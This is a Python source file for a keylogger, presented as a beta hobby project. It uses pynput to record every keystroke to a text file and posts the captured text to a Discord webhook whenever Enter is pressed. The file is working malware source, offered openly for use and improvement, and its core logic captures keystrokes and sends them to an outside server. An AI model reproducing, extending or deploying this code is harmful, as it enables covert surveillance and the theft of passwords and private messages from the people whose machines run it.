# Simple Keylogger that Logs Keys into a text file and then sends the info to a Discord Text Channel of your Liking via its Webhook.
# For more Information, check out the READ.ME, or contact Punch7577.
# NOTE: This is the BETA version of this project. It does not include a GUI. In the future, I will add a GUI to it to make it more interactive. It will likely have a localhost based GUI for users to use it on their web browser.
# Until then, enjoy the raw code and tell me what I can improve on.

from pynput.keyboard import Listener
import requests, time, os

# Webhook URL (for the Discord server)
url = 'The webhook'

# Global variable
replace = 0


def on_press(key):
    global replace
    with open('txt', 'a') as f: # IMPORTANT: You NEED to create a text file for this, or else it will not work. Replace the 'txt' in every open function with the name of your text file.
        k = str(key).replace("'", "")
        print(f'{key}')
        if k.find('space') > 0:
            f.write(' ')
        elif k.find('enter') > 0:
            replace += 1
            time.sleep(0.5)
            discordchannelsend()
            print('The Keylogger Logged some Keys!')
            file_linereplace(1)
        elif k.find('backspace') > 0:
            f.seek(f.tell() - 1, os.SEEK_SET)
            f.truncate()  # Deletes the last character typed in the code
        elif k.find('Key') == -1:
            f.write(k)


def file_linereplace(line_replace):
    with open('txt', 'r') as u:
        f = u.readlines()
        if 1 <= line_replace <= len(f):
            del f[line_replace - 1]
        else:
            print('Error: Line number out of range.') #This is the error message that will show if you click enter if there is nothing in the text file.
        with open('log', 'w') as d:
            for line in f:
                d.write(line)


def discordchannelsend():
    with open('txt', 'r') as lines:
        formatting = lines.readlines()
        NoDotsOrSquareBrackets = ''.join(formatting)

    data = {
        'avatar_url': 'Whatever you want the avatar to be',
        'username': 'Whatever you want the name of the bot to be',
        'content': 'Whatever you want it to say',
        'embeds': [
            {
                'title': '***INFO***',
                'color': 0x00FFFF, #Whatever color you want
                'description': NoDotsOrSquareBrackets
            }
        ]
    }
    requests.post(url, json=data)


def main():
    with open('txt', 'r') as file:
        content = file.read()
        print(content)

if __name__ == '__main__':
    main()
    with Listener(on_press=on_press) as listener:
        listener.join()
